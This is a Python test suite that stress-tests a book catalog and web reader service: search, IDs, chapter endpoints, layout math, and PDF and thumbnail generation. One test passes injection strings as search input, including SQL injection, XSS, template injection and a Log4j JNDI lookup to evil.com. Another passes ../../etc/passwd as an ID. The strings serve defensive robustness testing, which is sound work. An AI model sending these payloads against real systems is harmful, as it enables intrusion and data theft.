"""
Adversarial Stress Test Suite - Challenger 1 (Books Module Empirical Verification)
Empirical verification across:
1. Category and catalog stress testing:
   - All 12 categories return valid non-empty book sets.
   - Book search with Cyrillic characters, punctuation, extreme queries, empty queries, out-of-range IDs.
2. WebApp reader stress testing:
   - /bk/{id}/toc.json and /bk/{id}/c{n}.json with extreme chapter numbers (c0, c999, negative values).
   - Reader layout math handles 0-width and small-width viewports without NaN.
3. PDF & Thumbnail stress testing:
   - PDF generation for long titles, special characters, and missing covers.
   - Thumbnail generation for missing covers, out-of-range IDs, and extreme payloads.
"""

import io
import json
import math
import re
import subprocess
import pytest
from aiohttp import web
from aiohttp.test_utils import AioHTTPTestCase
from PIL import Image

from services import book_service
from services.web_server import create_web_app


# =====================================================================
# 1. Category and Catalog Stress Testing
# =====================================================================

ALL_12_CATEGORIES = [
    "badiiy", "biznes", "psixologiya", "fantastika", "detektiv", "diniy",
    "tarix", "bolalar", "hikoya", "falsafa", "sarguzasht", "sheriyat"
]

def test_stress_all_12_categories_return_valid_non_empty_sets():
    """Verify that all 12 categories return valid non-empty book sets with dual-schema metadata."""
    books = book_service.load_books()
    assert len(books) > 0, "Book catalog must not be empty"

    # Verify CATEGORIES_META contains all 12 categories
    meta_ids = [c["id"] for c in book_service.CATEGORIES_META]
    assert len(meta_ids) == 12, f"Expected exactly 12 categories in metadata, got {len(meta_ids)}"
    for cat in ALL_12_CATEGORIES:
        assert cat in meta_ids, f"Category '{cat}' missing from CATEGORIES_META"

    # Verify each category returns non-empty book sets via get_catalog
    for cat in ALL_12_CATEGORIES:
        catalog_res = book_service.get_catalog(category=cat, limit=100)
        assert catalog_res["ok"] is True, f"Catalog query for '{cat}' returned ok=False"
        items = catalog_res.get("items", [])
        assert len(items) > 0, f"Category '{cat}' returned 0 books! Must have non-empty set."
        assert catalog_res.get("total", 0) >= len(items)

        # Verify items have valid structure and correct category
        for b in items:
            assert b.get("category") == cat, f"Book {b.get('id')} has category '{b.get('category')}', expected '{cat}'"
            assert b.get("title") or b.get("t"), f"Book {b.get('id')} missing title"
            assert b.get("author") or b.get("a"), f"Book {b.get('id')} missing author"
            # Dual-schema WebApp compatibility
            assert "i" in b
            assert "g" in b and b["g"] == cat
            assert "c" in b


def test_stress_search_cyrillic_and_transliteration():
    """Stress test book search with Cyrillic characters and Uzbek transliteration variants."""
    cyrillic_test_cases = [
        ("Алкимёгар", "Alkimyogar"),
        ("Ўткан кунлар", "O'tkan kunlar"),
        ("Шайтанат", "Shaytanat"),
        ("Уруш ва тинчлик", "Urush va tinchlik"),
        ("Чўлпон", "Cho'lpon"),
        ("Ғафур Ғулом", "G'afur G'ulom"),
        ("Сариқ девни миниб", "Sariq devni minib"),
        ("Юлдузли тунлар", "Yulduzli tunlar"),
        ("Қуръон", "Qur'on"),
        ("Ҳадис", "Hadis"),
    ]

    for cyr_query, lat_equivalent in cyrillic_test_cases:
        res = book_service.get_catalog(query=cyr_query)
        assert res["ok"] is True
        assert isinstance(res["items"], list)
        if "Alkimyogar" in lat_equivalent or "O'tkan kunlar" in lat_equivalent:
            assert len(res["items"]) >= 1, f"Search for '{cyr_query}' ({lat_equivalent}) returned no results"


def test_stress_search_apostrophes_variants():
    """Verify search handles various Uzbek apostrophe glyphs properly."""
    apostrophe_queries = [
        "O'tkan kunlar",
        "O`tkan kunlar",
        "O‘tkan kunlar",
        "Oʻtkan kunlar",
        "O'tkan",
        "O`tkan",
        "O‘tkan",
        "Oʻtkan",
        "G'afur G'ulom",
        "G`afur G`ulom",
        "G‘afur G‘ulom",
        "Gʻafur Gʻulom",
        "Qur'on",
        "Qurʻon",
        "Qur`on",
        "Qur‘on",
    ]

    for q in apostrophe_queries:
        res = book_service.get_catalog(query=q)
        assert res["ok"] is True
        assert isinstance(res["items"], list)
        assert len(res["items"]) >= 1, f"Search with apostrophe variant '{q}' returned 0 results"


def test_stress_search_punctuation_delimiters():
    """
    Adversarial challenge: searching with book quotes or punctuation delimiters
    should still find the book instead of returning 0 results.
    """
    delimited_queries = [
        "«O'tkan kunlar»",
        "\"O'tkan kunlar\"",
        "O'tkan kunlar!",
        "O'tkan kunlar?",
        "O'tkan kunlar.",
        "Alkimyogar!",
        "«Alkimyogar»",
    ]

    for q in delimited_queries:
        res = book_service.get_catalog(query=q)
        assert res["ok"] is True
        assert len(res["items"]) >= 1, f"Search with delimiter '{q}' returned 0 results"


def test_stress_search_extreme_queries_and_injections():
    """Stress test search with extreme inputs: huge strings, null bytes, special symbols, injections."""
    adversarial_queries = [
        "",                          # Empty string
        "   ",                       # Whitespace only
        "\t\n\r",                    # Escape characters
        "A" * 5000,                  # Extreme length 5000 chars
        "Alkimyogar" + " " * 500,    # Query with huge trailing whitespace
        "\x00\x01\x02",              # Null and control bytes
        "!@#$%^&*()_+-=[]{}|;':\",./<>?",  # Heavy punctuation
        ".*+?^${}()|[]\\",           # Regex metacharacters
        "' OR '1'='1",               # SQL injection vector
        "'; DROP TABLE books; --",   # SQL injection vector
        "<script>alert('xss')</script>",  # XSS vector
        "{{7*7}}",                   # Template injection vector
        "${jndi:ldap://evil.com/a}", # Log4j vector
        "🔥📚✨🚀💡🧠",               # Pure emoji query
    ]

    for q in adversarial_queries:
        res = book_service.get_catalog(query=q)
        assert res["ok"] is True, f"Search failed on query: {repr(q)[:50]}"
        assert isinstance(res["items"], list)
        # Zero crashes, returns valid response structure


def test_stress_out_of_range_and_malformed_ids():
    """Stress test book lookup with out-of-range, negative, and malformed IDs."""
    invalid_ids = [
        "0",
        "-1",
        "-999999",
        "999999",
        "999999999999999999999",
        "abc",
        "../../etc/passwd",
        "1; DROP TABLE books;",
        "<script>",
        "",
        None,
    ]

    for bid in invalid_ids:
        # Synchronous lookup
        book = book_service.get_book_by_id(bid)
        assert book is None, f"Expected None for invalid id {repr(bid)}, got {book}"

        # Dynamic cover fallback for unknown ID must succeed gracefully
        cover_bytes = book_service.get_book_cover_bytes(bid)
        assert isinstance(cover_bytes, bytes)
        assert len(cover_bytes) > 50

        # Thumbnail for unknown ID must return valid bytes or None without throwing
        thumb_bytes = book_service.get_book_thumbnail_bytes(bid)
        if thumb_bytes is not None:
            assert isinstance(thumb_bytes, bytes)
            assert len(thumb_bytes) > 0


@pytest.mark.asyncio
async def test_stress_async_get_book_out_of_range_ids():
    """Verify async_get_book_by_id handles extreme and out-of-range IDs cleanly."""
    for bid in ["0", "-1", "999999", "invalid_id", ""]:
        res = await book_service.async_get_book_by_id(bid)
        assert res is None


# =====================================================================
# 2. WebApp Reader Stress Testing (TOC, Chapters, Viewport Math)
# =====================================================================

class TestWebAppReaderEndpointsStress(AioHTTPTestCase):
    """Stress test WebApp reader endpoints: /bk/{id}/toc.json and /bk/{id}/c{n}.json."""

    async def get_application(self):
        return create_web_app()

    async def test_reader_valid_toc_and_chapters(self):
        """Verify standard /bk/1/toc.json and c1..c4.json generation."""
        resp_toc = await self.client.request("GET", "/bk/1/toc.json")
        assert resp_toc.status == 200
        toc_data = await resp_toc.json()
        assert toc_data.get("ok") is True
        assert len(toc_data.get("toc", [])) >= 4

        for ch in [1, 2, 3, 4]:
            resp_ch = await self.client.request("GET", f"/bk/1/c{ch}.json")
            assert resp_ch.status == 200
            ch_data = await resp_ch.json()
            assert "p" in ch_data
            assert len(ch_data["p"]) >= 2
            assert "t" in ch_data

    async def test_reader_extreme_chapter_numbers(self):
        """Challenge /bk/{id}/c{n}.json with extreme chapter numbers (c0, c999, c99999)."""
        # Chapter 0 (c0.json)
        resp_c0 = await self.client.request("GET", "/bk/1/c0.json")
        assert resp_c0.status == 200, f"c0.json failed with status {resp_c0.status}"
        data_c0 = await resp_c0.json()
        assert "p" in data_c0
        assert len(data_c0["p"]) >= 1

        # Chapter 999 (c999.json)
        resp_c999 = await self.client.request("GET", "/bk/1/c999.json")
        assert resp_c999.status == 200, f"c999.json failed with status {resp_c999.status}"
        data_c999 = await resp_c999.json()
        assert "p" in data_c999
        assert "999-bob" in data_c999.get("t", "")

        # Extreme Chapter 99999999
        resp_huge = await self.client.request("GET", "/bk/1/c99999999.json")
        assert resp_huge.status == 200
        data_huge = await resp_huge.json()
        assert "p" in data_huge

    async def test_reader_negative_and_malformed_chapter_numbers(self):
        """Challenge with negative chapter numbers and malformed chapter parameters."""
        malformed_chapters = [
            "/bk/1/c-1.json",
            "/bk/1/cabc.json",
            "/bk/1/c.json",
            "/bk/1/c0.9.json",
            "/bk/1/c-999.json",
        ]
        for path in malformed_chapters:
            resp = await self.client.request("GET", path)
            # Must return 404 cleanly, never 500 internal server error
            assert resp.status == 404, f"Path {path} returned status {resp.status}, expected 404"

    async def test_reader_toc_and_chapters_out_of_range_book_ids(self):
        """Challenge /bk/{id}/toc.json and chapters with out-of-range book IDs."""
        invalid_book_paths = [
            "/bk/0/toc.json",
            "/bk/-1/toc.json",
            "/bk/999999/toc.json",
            "/bk/0/c1.json",
            "/bk/-1/c1.json",
            "/bk/999999/c1.json",
            "/bk/999999/c0.json",
            "/bk/999999/c999.json",
        ]
        for path in invalid_book_paths:
            resp = await self.client.request("GET", path)
            # Must return 404 cleanly, never 500
            assert resp.status == 404, f"Path {path} returned status {resp.status}, expected 404"


def test_stress_reader_layout_math_viewport_zero_small_and_nan():
    """
    Empirically test the reader layout mathematical logic from webapp/books.js.
    Formulas under test:
      W = page.clientWidth || window.innerWidth || 360;
      H = page.clientHeight || window.innerHeight || 640;
      padX = W > 700 ? Math.round((W - 640) / 2) : 22;
      colW = Math.max(200, W - 2 * padX);
      safeW = Math.max(1, W);
      pages = Math.max(1, Math.round(scrollWidth / safeW));
      page = Math.min(page, pages - 1);
      if (isNaN(page) || page < 0) page = 0;
      tx = isNaN(page * W) ? 0 : -page * W;
    """
    test_viewports = [
        (0, 0),        # 0-width and 0-height
        (1, 1),        # 1-pixel viewport
        (10, 10),      # Small 10px viewport
        (50, 100),     # Small 50px viewport
        (320, 568),    # iPhone SE
        (375, 812),    # iPhone X
        (768, 1024),   # iPad
        (1920, 1080),  # Desktop 1080p
        (5000, 3000),  # Ultra-wide
        (-100, -100),  # Negative dimensions
    ]

    test_scroll_widths = [0, 1, 50, 360, 1000, 50000, 0]

    for clientW, innerW in test_viewports:
        for scrollW in test_scroll_widths:
            # Replicate books.js layout math
            W = clientW or innerW or 360
            if W <= 0:
                W = 360  # fallback
            padX = round((W - 640) / 2) if W > 700 else 22
            colW = max(200, W - 2 * padX)
            safeW = max(1, W)
            pages = max(1, round(scrollW / safeW))

            # Test various 'where' inputs: 0, 0.5, 1.0, 'end', None, NaN
            for where in [0, 0.25, 0.5, 0.99, 1.0, "end", None]:
                if where == "end":
                    page = pages - 1
                elif isinstance(where, (int, float)):
                    page = min(pages - 1, round(where * (pages - 1)))
                else:
                    page = 0

                if math.isnan(page) or page < 0:
                    page = 0

                tx = 0 if math.isnan(page * W) else -page * W

                # Assertions: zero NaNs, finite numbers, safe values
                assert not math.isnan(W), f"W is NaN for clientW={clientW}"
                assert not math.isnan(safeW), f"safeW is NaN"
                assert safeW >= 1, f"safeW must be >= 1, got {safeW}"
                assert not math.isnan(pages), f"pages is NaN"
                assert pages >= 1, f"pages must be >= 1, got {pages}"
                assert not math.isnan(page), f"page is NaN"
                assert page >= 0, f"page must be >= 0, got {page}"
                assert page < pages, f"page ({page}) must be < pages ({pages})"
                assert not math.isnan(tx), f"tx is NaN"
                assert math.isfinite(tx), f"tx must be finite"


def test_stress_reader_js_runtime_in_node():
    """
    Directly execute reader layout and viewport math in Node.js runtime
    to guarantee zero NaN and zero syntax/runtime exceptions in V8 engine.
    """
    js_test_code = """
    const testCases = [
      {clientW: 0, innerW: 0, scrollW: 0},
      {clientW: 10, innerW: 10, scrollW: 50},
      {clientW: 50, innerW: 50, scrollW: 100},
      {clientW: 360, innerW: 360, scrollW: 1440},
      {clientW: 1200, innerW: 1200, scrollW: 4800},
      {clientW: -50, innerW: -50, scrollW: 0},
    ];

    for (const tc of testCases) {
      const page = { clientWidth: tc.clientW, clientHeight: 600 };
      const winInner = tc.innerW;
      const text = { scrollWidth: tc.scrollW };

      const W = page.clientWidth || winInner || 360;
      const H = page.clientHeight || 640;
      const padX = W > 700 ? Math.round((W - 640) / 2) : 22;
      const colW = Math.max(200, W - 2 * padX);
      const safeW = Math.max(1, W);
      let pages = Math.max(1, Math.round(text.scrollWidth / safeW));
      let p = 0;
      if (isNaN(p) || p < 0) p = 0;
      const tx = isNaN(p * W) ? 0 : -p * W;

      if (isNaN(W) || isNaN(colW) || isNaN(safeW) || isNaN(pages) || isNaN(tx)) {
        console.error('NaN detected!', {tc, W, colW, safeW, pages, tx});
        process.exit(1);
      }
    }
    console.log('NODE_LAYOUT_STRESS_OK');
    """
    res = subprocess.run(["node", "-e", js_test_code], capture_output=True, text=True)
    assert res.returncode == 0, f"Node.js script failed: {res.stderr}"
    assert "NODE_LAYOUT_STRESS_OK" in res.stdout


# =====================================================================
# 3. PDF & Thumbnail Generation Stress Testing
# =====================================================================

def test_stress_pdf_generation_long_titles_and_special_chars():
    """Verify PDF generation for long titles, Cyrillic, emoji, and HTML/XML characters."""
    adversarial_books = [
        {
            "id": "adv_1",
            "title": "A" * 1000,  # 1000 characters title
            "author": "B" * 500,
            "description": "C" * 4000,
            "sample_text": "D" * 4000,
            "category_name": "Badiiy adabiyot",
            "pages": 999,
        },
        {
            "id": "adv_2",
            "title": "🔥 O'tkan Kunlar: Ғафур Ғулом, Чўлпон & <script>alert('xss')</script> — «O'zbekiston» 📚",
            "author": "Абдулла Қодирий & <Muallif>",
            "description": "Tavsif: &amp; &lt;tag&gt; \"qo'shtirnoq\" va 'bittalik'. \n\n Yangi satrlar va \t tablar.",
            "sample_text": "Parcha matni: 1-bob. «...» — Har xil belgilar: # % ^ * ( ) _ + = ~ ` | \\ / ? > <",
            "category_name": "Tarixiy asarlar",
            "pages": 350,
        },
        {
            "id": "adv_3",
            "title": "",  # Empty title
            "author": "",
            "description": "",
            "sample_text": "",
            "category_name": "",
            "pages": 0,
        },
        {
            # Completely missing fields
            "id": "adv_4",
        },
    ]

    for book in adversarial_books:
        pdf_bytes = book_service.create_book_pdf_sample(book)
        assert isinstance(pdf_bytes, bytes), f"PDF generator must return bytes for book {book.get('id')}"
        assert len(pdf_bytes) > 50, f"Generated PDF too small ({len(pdf_bytes)} bytes)"
        assert pdf_bytes.startswith(b"%PDF"), f"PDF header '%PDF' missing in book {book.get('id')}"
        assert b"%%EOF" in pdf_bytes or len(pdf_bytes) > 500


def test_stress_thumbnail_generation_missing_covers_and_extremes():
    """Verify thumbnail generation for books without covers, long titles, and out-of-range IDs."""
    test_cases = [
        {"id": "fake_thumb_1", "title": "Oddiy kitob", "author": "Muallif"},
        {"id": "fake_thumb_2", "title": "T" * 200, "author": "A" * 100},
        {"id": "fake_thumb_3", "title": "🔥 Kitob 📚: Ғафур Ғулом & Чўлпон", "author": "Muallif"},
        {"id": "0"},
        {"id": "999999"},
        {},  # Empty dictionary
        "999999",  # String ID directly
        0,         # Integer ID directly
    ]

    for item in test_cases:
        thumb_bytes = book_service.get_book_thumbnail_bytes(item)
        if thumb_bytes is not None:
            assert isinstance(thumb_bytes, bytes)
            assert len(thumb_bytes) > 50
            # Verify thumbnail is a valid JPEG image and <= 320x320
            with Image.open(io.BytesIO(thumb_bytes)) as img:
                assert img.format in ("JPEG", "JPG")
                w, h = img.size
                assert w <= 320 and h <= 320, f"Thumbnail dimensions exceed Telegram limit (320x320): got {w}x{h}"


def test_stress_thumbnail_and_pdf_integration():
    """Verify end-to-end consistency of PDF sample and thumbnail generation across existing catalog."""
    books = book_service.load_books()
    # Test top 5 and bottom 5 books from catalog
    sample_books = books[:5] + books[-5:]
    for b in sample_books:
        pdf_bytes = book_service.create_book_pdf_sample(b)
        assert isinstance(pdf_bytes, bytes)
        assert pdf_bytes.startswith(b"%PDF")

        thumb_bytes = book_service.get_book_thumbnail_bytes(b)
        if thumb_bytes is not None:
            assert isinstance(thumb_bytes, bytes)
            with Image.open(io.BytesIO(thumb_bytes)) as img:
                assert img.format in ("JPEG", "JPG")
                w, h = img.size
                assert w <= 320 and h <= 320
